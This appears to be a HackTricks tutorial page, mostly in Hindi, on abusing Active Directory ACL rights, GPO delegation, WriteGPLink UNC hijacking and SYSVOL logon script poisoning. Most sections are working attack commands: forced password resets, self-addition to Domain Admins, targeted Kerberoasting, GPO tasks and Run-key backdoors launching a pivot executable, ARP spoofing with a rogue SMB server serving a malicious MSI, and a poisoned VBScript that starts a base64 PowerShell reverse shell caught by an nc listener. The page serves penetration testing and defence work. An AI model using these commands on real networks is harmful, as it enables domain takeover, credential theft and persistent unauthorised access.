# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**यह पेज मुख्य रूप से इन तकनीकों का सारांश है** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. अधिक विवरण के लिए, मूल लेख देखें।**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

यह privilege attacker को target user account पर पूरा control देता है। एक बार `Get-ObjectAcl` command का उपयोग करके `GenericAll` rights confirm हो जाने पर, attacker यह कर सकता है:

- **Target का Password बदलना**: `net user <username> <password> /domain` का उपयोग करके, attacker user का password reset कर सकता है।
- Linux से, आप Samba `net rpc` के साथ SAMR के जरिए भी यही कर सकते हैं:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **यदि account disabled है, तो UAC flag साफ़ करें**: `GenericAll` `userAccountControl` को edit करने की अनुमति देता है। Linux से, BloodyAD `ACCOUNTDISABLE` flag को हटा सकता है:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: SPN को उपयोगकर्ता के account पर assign करें ताकि वह kerberoastable बन जाए, फिर Rubeus और targetedKerberoast.py का उपयोग करके ticket-granting ticket (TGT) hashes को extract करें और crack करने का प्रयास करें.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: उपयोगकर्ता के लिए pre-authentication को disable करें, जिससे उनका account ASREPRoasting के लिए vulnerable हो जाता है.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: किसी user पर `GenericAll` के साथ आप certificate-based credential जोड़ सकते हैं और उनके password को बदले बिना उनके रूप में authenticate कर सकते हैं। देखें:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group पर GenericAll Rights**

यह privilege attacker को group memberships manipulate करने की अनुमति देता है अगर उनके पास `Domain Admins` जैसे किसी group पर `GenericAll` rights हों। `Get-NetGroup` के साथ group का distinguished name identify करने के बाद, attacker कर सकता है:

- **अपने आप को Domain Admins Group में जोड़ना**: यह direct commands के जरिए या Active Directory या PowerSploit जैसे modules का उपयोग करके किया जा सकता है।
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux से आप BloodyAD का उपयोग करके स्वयं को arbitrary groups में जोड़ सकते हैं जब आपके पास उन पर GenericAll/Write membership हो। अगर target group “Remote Management Users” में nested है, तो आपको उन hosts पर तुरंत WinRM access मिल जाएगा जो उस group को honor करते हैं:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

किसी computer object या user account पर ये privileges होने से निम्न संभव होता है:

- **Kerberos Resource-based Constrained Delegation**: किसी computer object का takeover करने में सक्षम बनाता है।
- **Shadow Credentials**: shadow credentials बनाने के privileges का दुरुपयोग करके किसी computer या user account की impersonation करने के लिए इस technique का उपयोग करें।

## **WriteProperty on Group**

यदि किसी user के पास किसी specific group (उदा., `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वे:

- **Add Themselves to the Domain Admins Group**: `net user` और `Add-NetGroupUser` commands को combine करके हासिल किया जा सकता है; यह method domain के भीतर privilege escalation की अनुमति देता है।
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

यह विशेषाधिकार हमलावरों को सीधे group membership manipulate करने वाले commands के माध्यम से खुद को specific groups, जैसे `Domain Admins`, में जोड़ने की अनुमति देता है। निम्नलिखित command sequence का उपयोग self-addition की अनुमति देता है:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

एक समान privilege, यह attackers को सीधे groups में खुद को add करने देता है, group properties को modify करके, यदि उनके पास उन groups पर `WriteProperty` right हो। इस privilege की confirmation और execution इस प्रकार की जाती है:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

किसी user पर `User-Force-Change-Password` के लिए `ExtendedRight` होना current password जाने बिना password reset करने देता है। इस right की verification और इसका exploitation PowerShell या alternative command-line tools के जरिए किया जा सकता है, जो user का password reset करने के कई तरीके देते हैं, जिसमें interactive sessions और non-interactive environments के लिए one-liners शामिल हैं। Commands simple PowerShell invocations से लेकर Linux पर `rpcclient` के उपयोग तक फैली होती हैं, जो attack vectors की versatility दिखाती हैं।
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group पर WriteOwner**

यदि कोई attacker पाता है कि उसके पास किसी group पर `WriteOwner` rights हैं, तो वह उस group का ownership अपने नाम पर बदल सकता है। यह खास तौर पर तब प्रभावी होता है जब संबंधित group `Domain Admins` हो, क्योंकि ownership बदलने से group attributes और membership पर अधिक व्यापक control मिल जाता है। इस process में `Get-ObjectAcl` के जरिए सही object की पहचान करना और फिर `Set-DomainObjectOwner` का उपयोग करके owner को, चाहे SID से हो या name से, modify करना शामिल है।
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **User पर GenericWrite**

यह अनुमति एक attacker को user properties modify करने देती है। Specifically, `GenericWrite` access के साथ, attacker किसी user के logon script path को बदल सकता है ताकि user के logon करते ही एक malicious script execute हो। यह `Set-ADObject` command का उपयोग करके target user की `scriptpath` property को update करके किया जाता है, ताकि वह attacker's script की ओर point करे।
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **Group पर GenericWrite**

इस privilege के साथ, attackers group membership को manipulate कर सकते हैं, जैसे खुद को या अन्य users को specific groups में add करना। इस process में एक credential object बनाना, उसका उपयोग करके users को group में add या remove करना, और PowerShell commands के साथ membership changes को verify करना शामिल है।
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux से, Samba `net` समूह में सदस्य जोड़/हटा सकता है जब आपके पास उस group पर `GenericWrite` हो (जब PowerShell/RSAT उपलब्ध न हों तब उपयोगी):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

किसी AD object का ownership होना और उस पर `WriteDACL` privileges होना attacker को उस object पर खुद को `GenericAll` privileges देने में सक्षम बनाता है। यह ADSI manipulation के माध्यम से किया जाता है, जिससे object पर full control और उसकी group memberships को modify करने की ability मिलती है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन privileges का exploit करने की कोशिश करते समय limitations मौजूद हैं।
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner त्वरित takeover (PowerView)

जब आपके पास किसी user या service account पर `WriteOwner` और `WriteDacl` हो, तो आप पूरा control ले सकते हैं और old password जाने बिना PowerView का उपयोग करके उसका password reset कर सकते हैं:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
टिप्पणियाँ:
- यदि आपके पास केवल `WriteOwner` है, तो आपको पहले owner को अपने नाम पर बदलना पड़ सकता है:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- पासवर्ड रीसेट के बाद किसी भी protocol (SMB/LDAP/RDP/WinRM) से access validate करें।

## **Replication on the Domain (DCSync)**

DCSync attack domain पर specific replication permissions का leverage लेकर Domain Controller की तरह mimic करता है और data synchronize करता है, जिसमें user credentials भी शामिल हैं। इस powerful technique के लिए `DS-Replication-Get-Changes` जैसी permissions चाहिए, जो attackers को Domain Controller तक direct access के बिना AD environment से sensitive information extract करने देती हैं। [**DCSync attack के बारे में यहाँ और जानें।**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को manage करने के लिए delegated access significant security risks पैदा कर सकता है। उदाहरण के लिए, अगर `offense\spotless` जैसा user GPO management rights delegated है, तो उसके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी privileges हो सकती हैं। इन permissions का malicious purposes के लिए abuse किया जा सकता है, जैसा कि PowerView से identify किया गया: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Misconfigured GPOs identify करने के लिए, PowerSploit के cmdlets को साथ में chain किया जा सकता है। इससे उन GPOs का discovery होता है जिन्हें कोई specific user manage करने की permissions रखता है: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**किसी दिए गए Policy के लागू होने वाले Computers**: यह पता लगाना संभव है कि कोई specific GPO किन computers पर apply होती है, जिससे संभावित impact का scope समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**किसी दिए गए Computer पर लागू Policies**: किसी particular computer पर कौन-सी policies लागू हैं, यह देखने के लिए `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।

**किसी दिए गए Policy के लागू होने वाले OUs**: किसी दिए गए policy से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

आप tool [**GPOHound**](https://github.com/cogiceo/GPOHound) का भी उपयोग करके GPOs enumerate कर सकते हैं और उनमें issues ढूँढ सकते हैं।

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs का exploit code execute करने के लिए किया जा सकता है, उदाहरण के लिए immediate scheduled task बनाकर। यह affected machines पर user को local administrators group में जोड़ने के लिए किया जा सकता है, जिससे privileges काफी बढ़ जाते हैं:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, यदि इंस्टॉल हो, तो नए GPOs बनाने और उन्हें लिंक करने की अनुमति देता है, और registry values जैसी preferences सेट करने की सुविधा देता है ताकि प्रभावित computers पर backdoors execute किए जा सकें। इस method के लिए GPO का updated होना और execution के लिए किसी user का computer में log in करना आवश्यक है:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO का दुरुपयोग

SharpGPOAbuse मौजूदा GPOs का दुरुपयोग करने की एक विधि प्रदान करता है, जिसमें नए GPOs बनाए बिना tasks जोड़कर या settings संशोधित करके काम किया जाता है। इस tool के लिए मौजूदा GPOs में modification करना या बदलाव लागू करने से पहले नए GPOs बनाने के लिए RSAT tools का उपयोग करना आवश्यक है:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO updates आम तौर पर हर 90 मिनट के आसपास होती हैं। इस प्रक्रिया को तेज़ करने के लिए, खासकर किसी बदलाव को लागू करने के बाद, target computer पर `gpupdate /force` command का उपयोग तुरंत policy update forced करने के लिए किया जा सकता है। यह command सुनिश्चित करती है कि GPOs में किए गए कोई भी बदलाव अगली automatic update cycle का इंतज़ार किए बिना लागू हो जाएँ।

### Under the Hood

किसी दिए गए GPO, जैसे `Misconfigured Policy`, के Scheduled Tasks की inspection करने पर `evilTask` जैसे tasks का जोड़ confirm किया जा सकता है। ये tasks scripts या command-line tools के माध्यम से बनाए जाते हैं, जिनका उद्देश्य system behavior modify करना या privileges escalate करना होता है।

`New-GPOImmediateTask` द्वारा generated XML configuration file में दिखाए गए task की structure scheduled task की specifics बताती है - जिसमें execute होने वाला command और उसके triggers शामिल होते हैं। यह file दर्शाती है कि scheduled tasks GPOs के भीतर कैसे defined और managed होते हैं, और policy enforcement के हिस्से के रूप में arbitrary commands या scripts execute करने का एक method प्रदान करती है।

### Users and Groups

GPOs target systems पर user और group memberships के manipulation की भी अनुमति देती हैं। Users and Groups policy files को सीधे edit करके, attackers users को privileged groups, जैसे local `administrators` group, में जोड़ सकते हैं। यह GPO management permissions की delegation के माध्यम से संभव है, जो policy files को modify करके नए users जोड़ने या group memberships बदलने की अनुमति देती है।

Users and Groups के लिए XML configuration file बताती है कि ये changes कैसे implement किए जाते हैं। इस file में entries जोड़कर, specific users को affected systems पर elevated privileges दिए जा सकते हैं। यह method GPO manipulation के माध्यम से privilege escalation का एक direct approach प्रदान करती है।

इसके अलावा, code execute करने या persistence बनाए रखने के लिए अतिरिक्त methods, जैसे logon/logoff scripts का उपयोग, autoruns के लिए registry keys modify करना, .msi files के जरिए software install करना, या service configurations edit करना, भी विचार किए जा सकते हैं। ये techniques GPOs के abuse के माध्यम से access बनाए रखने और target systems को control करने के विभिन्न रास्ते प्रदान करती हैं।

### WriteGPLink + UNC path hijacking (ARP spoofing)

किसी OU/domain पर `WriteGPLink` आपको target container के `gPLink` attribute को modify करने और **GPO को खुद edit किए बिना** किसी existing GPO को **force करके apply** करने देता है। यह तब दिलचस्प होता है जब linked GPO पहले से ही **UNC paths** (`\\HOST\share\...`) के जरिए remote content reference करता हो, क्योंकि authenticated users **SYSVOL** पढ़ सकते हैं और reusable policies को offline hunt कर सकते हैं।

High-level workflow:

1. BloodHound का उपयोग करके ऐसा principal identify करें जिसके पास किसी OU पर `WriteGPLink` हो, और उस OU के अंदर मौजूद computers/users enumerate करें।
2. `SYSVOL` को read-only clone करें और GPOs parse करके **Software Installation**, **drive mappings** (`Drives.xml`), और **logon/startup scripts** खोजें जो UNC paths reference करते हों।
3. ऐसी policies को prefer करें जो **direct hostname** (उदाहरण के लिए `\\DC02\share\pkg.msi`) की ओर point करती हों, बजाय DFS/domain-namespace paths के, क्योंकि hostname-based paths को L2 spoofing से redirect करना आसान होता है।
4. चुने गए GPO GUID को target OU के `gPLink` में append करें ताकि victim पहले से मौजूद उसी policy को process करे।
5. उसी broadcast domain पर, UNC host का ARP spoof करें और उसकी IP को locally bind करें (`ip addr add <target_ip>/32 dev <iface>`) ताकि victim का SMB traffic आपकी host तक पहुँचे।
6. attacker SMB server (उदाहरण के लिए `smbserver.py`) से expected path/filename serve करें और normal policy processing का इंतज़ार करें।

Example `SYSVOL` collection and GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
मौजूदा GPO को target OU से link करें:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

अगर linked GPO एक UNC path से MSI deploy करता है, तो client उसे **computer startup** के दौरान fetch करेगा और उसे **`NT AUTHORITY\SYSTEM`** के रूप में install करेगा। referenced host को spoof करके और **same share/path/name** के तहत एक malicious MSI serve करके, आप **SYSVOL** को modify किए बिना `WriteGPLink` को SYSTEM code execution में बदल सकते हैं।

महत्वपूर्ण constraints:

- **Timing matters**: नया link policy refresh पर दिखता है (आम तौर पर ~90 minutes), लेकिन **Software Installation** आमतौर पर **reboot** पर trigger होता है।
- Windows Installer आमतौर पर deployment को package **`ProductCode`** का उपयोग करके track करता है। अगर product पहले से installed है, तो deployment skip हो सकता है।
- installer rejection से बचने के लिए, rogue MSI को patch करें ताकि उसका **`ProductCode`** और **`PackageCode`** GPO द्वारा expected legitimate package से match करें।
- पुराने `.aas` advertisement files **SYSVOL** में रह सकते हैं, इसलिए उस पर भरोसा करने से पहले validate करें कि deployment अभी भी active दिख रहा है।
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` में GPP drive mappings logon या reconnection के दौरान users को configured UNC path पर authenticate कराते हैं। अगर आप referenced host को spoof करते हैं, तो आप **NetNTLMv2** capture कर सकते हैं। अगर SMB को deliberately fail कराया जाए, तो Windows **WebDAV** over retry कर सकता है, जिससे **NTLM over HTTP** भेजा जाता है, जो **LDAP(S)**, **AD CS**, या **SMB** तक relays के लिए कहीं अधिक flexible होता है।

#### Logon/startup script UNC hijack

यही pattern `SYSVOL` में मिले UNC-hosted scripts पर भी लागू होता है:

- **Logon scripts** आमतौर पर **user** context में execute होते हैं।
- **Startup scripts** आमतौर पर **computer / SYSTEM** context में execute होते हैं।

अगर script path किसी spoofable hostname की ओर point करता है, तो UNC host को redirect करें और expected location से replacement script content serve करें।

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` या `\\<dc>\NETLOGON\` के under writable paths, GPO के जरिए user logon पर execute होने वाले logon scripts में tampering की अनुमति देते हैं। इससे logging users के security context में code execution मिलता है।

### Locate logon scripts
- user attributes में configured logon script की जांच करें:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- scripts के shortcuts या references को surface करने के लिए domain shares को crawl करें:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` फ़ाइलों को parse करें ताकि SYSVOL/NETLOGON की ओर pointing targets resolve किए जा सकें (एक useful DFIR trick और उन attackers के लिए भी जो सीधे GPO access नहीं रखते):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound user nodes पर मौजूद होने पर `logonScript` (scriptPath) attribute दिखाता है।

### write access validate करें (share listings पर भरोसा न करें)
Automated tooling SYSVOL/NETLOGON को read-only दिखा सकती है, लेकिन underlying NTFS ACLs फिर भी writes allow कर सकती हैं। हमेशा test करें:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
यदि file size या mtime बदलता है, तो आपके पास write है। modifying से पहले originals preserve करें।

### RCE के लिए VBScript logon script को poison करें
एक command append करें जो PowerShell reverse shell (revshells.com से generate किया गया) launch करती है, और business function को break होने से बचाने के लिए original logic को बनाए रखें:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
अपने host पर listen करें और अगले interactive logon का इंतज़ार करें:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- Execution logging user’s token के तहत होता है (SYSTEM नहीं). Scope उस GPO link (OU, site, domain) तक सीमित है जो उस script को apply कर रहा है.
- उपयोग के बाद original content/timestamps को restore करके clean up करें.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
